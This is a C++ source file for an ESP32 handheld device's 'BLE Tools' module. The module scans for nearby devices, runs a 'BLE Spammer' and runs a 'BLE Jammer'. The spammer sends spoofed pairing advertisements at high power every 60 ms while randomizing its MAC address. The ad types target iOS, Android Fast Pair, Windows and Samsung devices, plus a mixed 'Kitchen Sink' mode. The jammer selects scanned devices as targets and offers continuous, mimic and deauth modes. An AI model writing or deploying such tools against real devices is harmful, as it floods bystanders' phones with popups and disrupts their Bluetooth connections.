#include "ble-module.h"
#include "ble_jammer_utils.h"
#include <esp_mac.h>
#include <esp_bt.h>

void BLEModule::init() {
    currentState = MENU;
    menuIndex = 0;
    selectedIndex = 0;
    scrollOffset = 0;
    isScanning = false;
    isSpamming = false;
    currentSpamType = IOS_POPUP;
    lastSpamUpdate = 0;
    lastScanTime = 0;
    jammerMode = JAM_CONTINUOUS;

    // Initialize BLE only once if possible, or handle re-init
    // BLEDevice::init checks internally? No, usually not safe to call twice without deinit.
    // We'll use a static flag or check if we can deinit on exit.
    // For now, let's assume we keep BLE active or check if initialized.
    // Since we can't easily check, we'll use a static flag.
    static bool bleInitialized = false;
    if (!bleInitialized) {
        BLEDevice::init("ESP-Chain");
        bleInitialized = true;
    }
    
    // Set max power for "stronger" signal
    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9); 
    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_SCAN, ESP_PWR_LVL_P9);
    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_DEFAULT, ESP_PWR_LVL_P9);

    pBLEScan = BLEDevice::getScan();
    pBLEScan->setActiveScan(true);
    pBLEScan->setInterval(100);
    pBLEScan->setWindow(99);
    
    // Reuse server if exists?
    if (pServer == nullptr) {
        pServer = BLEDevice::createServer();
    }
    pAdvertising = BLEDevice::getAdvertising();
    
    // Configure advertising
    pAdvertising->addServiceUUID("1234");
    pAdvertising->setScanResponse(true);
    pAdvertising->setMinPreferred(0x06);  
    pAdvertising->setMinPreferred(0x12);
    
    // Initialize jammer utils
    BLEJammerUtils::init();
    
    initialized = true;
}

void BLEModule::loop() {
    // Jammer loop
    if (currentState == BLEJAMMER && BLEJammerUtils::isJamming()) {
        BLEJammerUtils::loop();
    }
    
    if (currentState == BLESPAM && isSpamming) {
        // Spam loop - Faster (60ms cycle approx)
        if (millis() - lastSpamUpdate > 60) { 
            lastSpamUpdate = millis();
            
            pAdvertising->stop();
            
            // Randomize MAC
            uint8_t mac[6];
            BLESpamUtils::generateRandomMac(mac);
            esp_base_mac_addr_set(mac);
            
            // Re-init BLE to apply MAC change
            // This is heavy but necessary for full MAC randomization with standard library
            BLEDevice::deinit(); 
            BLEDevice::init(""); 
            
            // Re-set power after init
            esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9);
            
            pAdvertising = BLEDevice::getAdvertising();
            
            // Determine Spam Type
            SpamType typeToUse = currentSpamType;
            if (currentSpamType == KITCHEN_SINK) {
                // Randomly select one of the first 4 types
                typeToUse = (SpamType)random(0, 4);
            }

            // Get Payload
            std::vector<uint8_t> payload = BLESpamUtils::getAdvertisementData(typeToUse);
            std::string dataStr((char*)payload.data(), payload.size());
            
            BLEAdvertisementData oAdvertisementData = BLEAdvertisementData();
            
            if (typeToUse == ANDROID_PAIR) {
                // Android Fast Pair Service Data
                BLEUUID uuid((uint16_t)0xFE2C);
                oAdvertisementData.setServiceData(uuid, dataStr);
                oAdvertisementData.setCompleteServices(uuid); // Add the UUID announcement
                oAdvertisementData.setFlags(0x06); // General Discoverable + BR/EDR Not Supported
            } else {
                // Manufacturer Data for others (iOS, Windows, Samsung)
                oAdvertisementData.setManufacturerData(dataStr);
            }
            
            pAdvertising->setAdvertisementData(oAdvertisementData);
            pAdvertising->setMinPreferred(0x06);
            pAdvertising->setMinPreferred(0x12);
            pAdvertising->start();
        }
    }
}

void BLEModule::startScan() {
    isScanning = true;
    // Don't clear immediately if we want to keep old results while scanning?
    // But for a fresh scan, we should clear.
    foundDevices.clear();
    foundAddresses.clear();
    foundRSSIs.clear();
    scannedDevices.clear();
    
    // Reset selection on new scan
    selectedIndex = 0;
    scrollOffset = 0;
    
    // Scan for 1 second (blocking)
    BLEScanResults found = pBLEScan->start(1, false);
    
    int count = found.getCount();
    for (int i = 0; i < count; i++) {
        BLEAdvertisedDevice device = found.getDevice(i);
        
        // Copy strings immediately while device is valid
        std::string nameStd = device.getName();
        std::string addrStd = device.getAddress().toString();
        String name = String(nameStd.c_str());
        String address = String(addrStd.c_str());
        int rssi = device.getRSSI();
        
        if (name.length() == 0) {
            name = address;
        }
        foundDevices.push_back(name);
        foundAddresses.push_back(address);
        foundRSSIs.push_back(rssi);
        
        // Create target device inline to avoid reference issues
        BLETargetDevice target;
        target.name = name;
        target.address = address;
        target.rssi = rssi;
        target.isConnectable = false;
        target.serviceUUID = "";
        
        scannedDevices.push_back(target);
    }
    
    pBLEScan->clearResults();
    lastScanTime = millis();
    isScanning = false; // Scan finished
}

void BLEModule::stopScan() {
    isScanning = false;
    pBLEScan->stop();
}

void BLEModule::toggleSpam() {
    isSpamming = !isSpamming;
    if (!isSpamming) {
        pAdvertising->stop();
    }
}

void BLEModule::selectDeviceForJammer(int index) {
    if (index >= 0 && index < (int)scannedDevices.size() && !scannedDevices.empty()) {
        BLEJammerUtils::setTarget(scannedDevices[index]);
    }
}

void BLEModule::toggleJammer() {
    if (BLEJammerUtils::isJamming()) {
        BLEJammerUtils::stopJamming();
    } else {
        BLEJammerUtils::startJamming(jammerMode);
    }
}

void BLEModule::drawMenu(DisplayManager* display) {
    // display->clearContent();
    
    // Null check
    if (!display) return;
    
    // Store display pointer for redraws
    this->displayManager = display;
    
    if (currentState == MENU) {
        display->clearMenu();
        display->drawMenuTitle("BLE Tools");
        display->drawMenuItem("BLE Scanner", 0, menuIndex == 0);
        display->drawMenuItem("BLE Spammer", 1, menuIndex == 1);
        display->drawMenuItem("BLE Jammer", 2, menuIndex == 2);
        display->updateMenu();
    } 
    else if (currentState == SCANNER) {
        String title = "Scanner";
        if (BLEJammerUtils::hasTarget()) {
            title = "Scanner [Target Set]";
        }
        display->drawMenuTitle(title);
        
        if (foundDevices.empty()) {
            display->clearContent();
            display->getTFT()->setTextColor(TFT_WHITE);
            display->getTFT()->setTextDatum(TL_DATUM);
            display->getTFT()->drawString(isScanning ? "Scanning..." : "No devices", 10, 40, 2);
        } else {
            display->clearMenu();
            // Draw list
            int itemsPerPage = 5; // Assuming 5 fits
            int count = foundDevices.size();
            
            for (int i = 0; i < itemsPerPage; i++) {
                int idx = scrollOffset + i;
                if (idx >= count) break;
                
                String label = foundDevices[idx] + " " + String(foundRSSIs[idx]);
                display->drawMenuItem(label, i, selectedIndex == idx);
            }
            display->drawScrollBar(count, scrollOffset, itemsPerPage);
            display->updateMenu();
        }
    }
    else if (currentState == BLESPAM) {
        display->clearContent();
        display->drawMenuTitle("Spammer");
        display->getTFT()->setTextColor(TFT_WHITE);
        display->getTFT()->setTextDatum(TL_DATUM);
        
        String status = "Status: " + String(isSpamming ? "RUNNING" : "STOPPED");
        display->getTFT()->drawString(status, 10, 40, 2);
        
        String typeStr = "Type: ";
        switch(currentSpamType) {
            case IOS_POPUP: typeStr += "iOS"; break;
            case ANDROID_PAIR: typeStr += "Android"; break;
            case WINDOWS_PAIR: typeStr += "Windows"; break;
            case SAMSUNG_PAIR: typeStr += "Samsung"; break;
            case KITCHEN_SINK: typeStr += "Kitchen Sink"; break;
        }
        display->getTFT()->drawString(typeStr, 10, 65, 2);
        
        display->getTFT()->drawString("UP/DN: Change Type", 10, 90, 2);
        display->getTFT()->drawString("SELECT: Start/Stop", 10, 110, 2);
    }
    else if (currentState == BLEJAMMER) {
        // Extra safety checks
        if (!display) return;
        
        TFT_eSPI* tft = display->getTFT();
        if (!tft) return;
        
        // Clear and setup
        display->clearContent();
        display->drawMenuTitle("BLE Jammer");
        
        // Set text properties once
        tft->setTextColor(TFT_WHITE, TFT_BLACK);
        tft->setTextDatum(TL_DATUM);
        
        // Use simple text without function calls
        tft->drawString("Status:", 10, 40, 2);
        if (BLEJammerUtils::isJamming()) {
            tft->drawString("JAMMING", 90, 40, 2);
        } else {
            tft->drawString("STOPPED", 90, 40, 2);
        }
        
        // Target info
        tft->drawString("Target:", 10, 60, 2);
        if (BLEJammerUtils::hasTarget()) {
            tft->drawString("SET", 90, 60, 2);
        } else {
            tft->drawString("NONE", 90, 60, 2);
        }
        
        // Mode
        tft->drawString("Mode:", 10, 80, 2);
        switch(jammerMode) {
            case JAM_CONTINUOUS: tft->drawString("Continuous", 70, 80, 2); break;
            case JAM_REACTIVE: tft->drawString("Mimic", 70, 80, 2); break;
            case JAM_DEAUTH: tft->drawString("Deauth", 70, 80, 2); break;
        }
        
        // Help text
        tft->drawString("UP/DN:Mode SEL:Start", 10, 120, 1);
    }
}

bool BLEModule::handleInput(uint8_t button) {
    // 0=Up, 1=Down, 2=Select, 3=Back
    
    // Safety check - ensure displayManager is valid
    if (!displayManager) return true;
    
    if (currentState == MENU) {
        if (button == 0) { // Up
            menuIndex--;
            if (menuIndex < 0) menuIndex = 2;
            drawMenu(displayManager); // Force redraw
        } else if (button == 1) { // Down
            menuIndex++;
            if (menuIndex > 2) menuIndex = 0;
            drawMenu(displayManager); // Force redraw
        } else if (button == 2) { // Select
            if (menuIndex == 0) {
                currentState = SCANNER;
                startScan();
            } else if (menuIndex == 1) {
                currentState = BLESPAM;
            } else if (menuIndex == 2) {
                currentState = BLEJAMMER;
            }
            delay(50); // Give time for state change
            drawMenu(displayManager); // Force redraw
        } else if (button == 3) { // Back
            // Stop everything when exiting module
            stopScan();
            if (isSpamming) toggleSpam();
            BLEJammerUtils::stopJamming();
            return false; // Exit module
        }
    }
    else if (currentState == SCANNER) {
        if (button == 0) { // Up
            if (foundDevices.size() > 0) {
                selectedIndex--;
                if (selectedIndex < 0) {
                    selectedIndex = foundDevices.size() - 1; // Wrap around
                }
                
                // Adjust scroll offset
                if (selectedIndex < scrollOffset) {
                    scrollOffset = selectedIndex;
                } else if (selectedIndex >= scrollOffset + 5) {
                    scrollOffset = selectedIndex - 4;
                }
                drawMenu(displayManager); // Force redraw
            }
        } else if (button == 1) { // Down
            if (foundDevices.size() > 0) {
                selectedIndex++;
                if (selectedIndex >= foundDevices.size()) {
                    selectedIndex = 0; // Wrap around
                }
                
                // Adjust scroll offset
                if (selectedIndex >= scrollOffset + 5) {
                    scrollOffset = selectedIndex - 4;
                } else if (selectedIndex < scrollOffset) {
                    scrollOffset = selectedIndex;
                }
                drawMenu(displayManager); // Force redraw
            }
        } else if (button == 2) { // Select - Select device for jammer
            if (!scannedDevices.empty() && selectedIndex >= 0 && selectedIndex < (int)scannedDevices.size()) {
                selectDeviceForJammer(selectedIndex);
                // Stay in scanner, don't transition yet
                // currentState = BLEJAMMER;
                // Show brief confirmation by redrawing
            }
            drawMenu(displayManager);
        } else if (button == 3) { // Back
            stopScan();
            currentState = MENU;
            drawMenu(displayManager); // Force redraw
        }
    }
    else if (currentState == BLESPAM) {
        if (button == 0) { // Up
            int type = (int)currentSpamType;
            type--;
            if (type < 0) type = 4; // KITCHEN_SINK
            currentSpamType = (SpamType)type;
            drawMenu(displayManager);
        } else if (button == 1) { // Down
            int type = (int)currentSpamType;
            type++;
            if (type > 4) type = 0; // IOS_POPUP
            currentSpamType = (SpamType)type;
            drawMenu(displayManager);
        } else if (button == 2) { // Select
            toggleSpam();
            drawMenu(displayManager); // Force redraw
        } else if (button == 3) { // Back
            if (isSpamming) toggleSpam();
            currentState = MENU;
            drawMenu(displayManager); // Force redraw
        }
    }
    else if (currentState == BLEJAMMER) {
        if (button == 0) { // Up - Change mode
            int mode = (int)jammerMode;
            mode--;
            if (mode < 0) mode = 2; // JAM_DEAUTH
            jammerMode = (JammerMode)mode;
            BLEJammerUtils::setMode(jammerMode);
            drawMenu(displayManager);
        } else if (button == 1) { // Down - Change mode
            int mode = (int)jammerMode;
            mode++;
            if (mode > 2) mode = 0; // JAM_CONTINUOUS
            jammerMode = (JammerMode)mode;
            BLEJammerUtils::setMode(jammerMode);
            drawMenu(displayManager);
        } else if (button == 2) { // Select - Toggle jammer
            toggleJammer();
            drawMenu(displayManager);
        } else if (button == 3) { // Back
            BLEJammerUtils::stopJamming();
            currentState = MENU;
            drawMenu(displayManager);
        }
    }
    
    return true;
}
